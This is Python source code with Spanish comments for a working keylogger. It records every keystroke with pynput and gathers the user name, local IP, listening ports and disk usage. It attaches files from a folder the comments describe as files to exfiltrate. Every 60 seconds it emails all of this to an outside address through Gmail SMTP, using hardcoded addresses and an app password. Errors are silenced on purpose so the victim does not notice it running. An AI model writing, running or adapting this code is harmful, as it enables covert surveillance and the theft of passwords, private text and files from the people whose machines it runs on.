import threading
import smtplib
import mimetypes
import socket  # Necesario para obtener la IP
import getpass # Necesario para obtener el usuario
import psutil  # <--- Necesario para puertos y almacenamiento
import platform # <--- Útil para info del sistema
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path
from pynput import keyboard

# ──────────────────────────────────────────────────────────
#  CONFIGURA TUS CREDENCIALES
# ──────────────────────────────────────────────────────────
REMITENTE     = "pabloescada3@gmail.com"
DESTINATARIO  = "mago.personal@outlook.com"
CLAVE_APP_GMA = "aasu olet lmpx iayp"        # ← sin espacios

# Carpeta donde colocarás los ficheros a exfiltrar
CARPETA_ADJUNTOS        = Path(__file__).with_name("adjuntos")
LIMITE_TOTAL_ADJUNTOS   = 8 * 1024 * 1024      # 8 MB

# ──────────────────────────────────────────────────────────
current_log = []
lock        = threading.Lock()

# ──────────────── FUNCIONES AUXILIARES ───────────────────

def format_bytes(size: int) -> str:
    """Convierte bytes a un formato legible (KB, MB, GB, TB)."""
    power = 2**10 # 1024
    n = 0
    power_labels = {0: '', 1: 'K', 2: 'M', 3: 'G', 4: 'T'}
    while size > power:
        size /= power
        n += 1
    return f"{size:.2f} {power_labels[n]}B"

def obtener_info_sistema() -> tuple[str, str, str, str]:
    """Obtiene usuario, IP local, puertos abiertos (LISTEN) y uso de almacenamiento."""
    # --- Usuario ---
    try:
        usuario = getpass.getuser()
    except Exception:
        usuario = "Desconocido"

    # --- IP Local ---
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip_address = "Desconocida (Error DNS)"
    except Exception:
        ip_address = "Desconocida (Error General)"

    # --- Puertos Abiertos (LISTEN) ---
    puertos_listen_str = "No disponible (requiere psutil)"
    try:
        puertos_listen = set()
        conexiones = psutil.net_connections(kind='inet') # inet incluye TCP/UDP IPv4/v6
        for conn in conexiones:
            # Nos interesan principalmente los puertos que están escuchando
            if conn.status == psutil.CONN_LISTEN and conn.laddr and conn.laddr.port:
                 puertos_listen.add(str(conn.laddr.port)) # Guardamos como string

        if puertos_listen:
             # Ordenamos numéricamente si es posible, si no, alfabéticamente
            try:
                puertos_ordenados = sorted(list(puertos_listen), key=int)
            except ValueError:
                 puertos_ordenados = sorted(list(puertos_listen))
            puertos_listen_str = ", ".join(puertos_ordenados)
            if not puertos_listen_str:
                 puertos_listen_str = "Ninguno en estado LISTEN"
        else:
            puertos_listen_str = "Ninguno encontrado o error al leer"

    except Exception as e:
        puertos_listen_str = f"Error al obtener puertos: {e}"

    # --- Uso de Almacenamiento ---
    almacenamiento_str = "No disponible (requiere psutil)"
    try:
        particiones_info = []
        # Obtenemos todas las particiones de disco físico (filtramos cdrom, etc.)
        particiones = psutil.disk_partitions(all=False)
        for part in particiones:
             # Intentamos filtrar particiones de sistema virtual o no útiles
            if 'rw' in part.opts.lower() and part.fstype: # Solo lectura-escritura y con sistema de archivos
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    info_linea = (
                        f"  - {part.device} ({part.mountpoint}, {part.fstype}): "
                        f"{format_bytes(usage.used)} usados / {format_bytes(usage.total)} total "
                        f"({usage.percent}%)"
                    )
                    particiones_info.append(info_linea)
                except Exception:
                    # Ignorar errores para puntos de montaje específicos (ej. permisos)
                     particiones_info.append(f"  - {part.device} ({part.mountpoint}): Error al leer uso")

        if particiones_info:
            almacenamiento_str = "\n".join(particiones_info)
        else:
            almacenamiento_str = "No se encontraron particiones válidas o error."

    except Exception as e:
        almacenamiento_str = f"Error al obtener almacenamiento: {e}"


    return usuario, ip_address, puertos_listen_str, almacenamiento_str

def adjuntar_archivos(msg: EmailMessage) -> None:
    """Añade como adjuntos los ficheros de la carpeta indicada
       respetando el límite de tamaño configurado."""
    if not CARPETA_ADJUNTOS.exists():
        return

    total = 0
    for fichero in CARPETA_ADJUNTOS.iterdir():
        if not fichero.is_file():
            continue
        peso = fichero.stat().st_size
        if total + peso > LIMITE_TOTAL_ADJUNTOS:
            continue

        tipo, _ = mimetypes.guess_type(fichero)
        maintype, subtype = (tipo or "application/octet-stream").split("/", 1)
        with fichero.open("rb") as fp:
            msg.add_attachment(
                fp.read(),
                maintype=maintype,
                subtype=subtype,
                filename=fichero.name,
            )
        total += peso

def enviar_email(cuerpo: str) -> None:
    """Envía el log y los adjuntos por correo, incluyendo info del sistema."""
    try:
        # --- Obtener información del sistema ---
        usuario_pc, ip_pc, puertos_abiertos, uso_disco = obtener_info_sistema()
        ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        os_info = f"{platform.system()} {platform.release()} ({platform.machine()})"
        # --- Fin obtener información ---

        mensaje = EmailMessage()
        mensaje["From"]    = REMITENTE
        mensaje["To"]      = DESTINATARIO
        mensaje["Subject"] = f"Log de {usuario_pc}@{ip_pc} - {ahora}"

        # --- Crear el cuerpo del mensaje con toda la info ---
        cuerpo_completo = f"--- Información del Dispositivo ---\n"
        cuerpo_completo += f"Usuario: {usuario_pc}\n"
        cuerpo_completo += f"IP Local: {ip_pc}\n"
        cuerpo_completo += f"Sistema Operativo: {os_info}\n"
        cuerpo_completo += f"Fecha y Hora (Envío): {ahora}\n\n"

        cuerpo_completo += f"--- Puertos TCP Abiertos (LISTEN) ---\n"
        cuerpo_completo += f"{puertos_abiertos}\n\n"

        cuerpo_completo += f"--- Uso de Almacenamiento ---\n"
        cuerpo_completo += f"{uso_disco}\n\n"

        cuerpo_completo += "--- Log de Teclado ---\n"
        cuerpo_completo += cuerpo # Añadir el log de teclas capturado
        # --- Fin creación cuerpo ---

        mensaje.set_content(cuerpo_completo)

        adjuntar_archivos(mensaje)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(REMITENTE, CLAVE_APP_GMA)
            smtp.send_message(mensaje)
    except Exception as e:
        # Silenciar cualquier error para no delatar la ejecución
        # print(f"Error enviando email: {e}") # Descomentar SOLO para depuración
        pass

# ───────────── ENVÍO TEMPORIZADO ─────────────
def save_log():
    global current_log
    with lock:
        if current_log:
            log_para_enviar = "\n".join(current_log)
            enviar_email(log_para_enviar) # Pasamos el log actual
            current_log = [] # Limpiamos el log después de enviarlo
    # Re-programar el timer para la próxima ejecución (ej. cada 60 segundos)
    threading.Timer(60, save_log).start()

# ───────────── CAPTURA DE TECLAS ─────────────
def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with lock:
        try:
            current_log.append(f"{timestamp} Tecla: '{key.char}'")
        except AttributeError:
            tecla = str(key).replace('Key.', '').upper()
            current_log.append(f"{timestamp} Tecla especial: [{tecla}]")

# ───────────── EJECUCIÓN ─────────────

# --- ¡¡¡ IMPORTANTE !!! ---
# Asegúrate de haber instalado psutil: pip install psutil
# ---

# Inicia el temporizador de envío la primera vez
save_log()

# Inicia el listener del teclado
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    # Opcional: podrías intentar enviar un último correo de error aquí
    # print(f"Error iniciando el listener: {e}")
    pass # Mantener silencio